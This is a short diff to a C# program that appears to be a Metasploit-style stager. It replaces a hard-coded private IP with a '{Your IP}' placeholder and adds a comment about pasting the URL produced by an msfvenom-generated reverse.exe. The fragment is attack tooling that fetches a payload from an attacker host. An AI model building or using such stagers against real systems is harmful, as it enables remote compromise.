@@ -26,7 +26,8 @@ public class Program
 
     public static void Main()
     {
-        string url = "https://192.168.0.35:8080/nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
+        //Paste the URL after twistd3 checks the request sent from the reverse.exe created by msfvenom
+        string url = "https://{Your IP}:8080/nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
         Stager(url);
     }
 
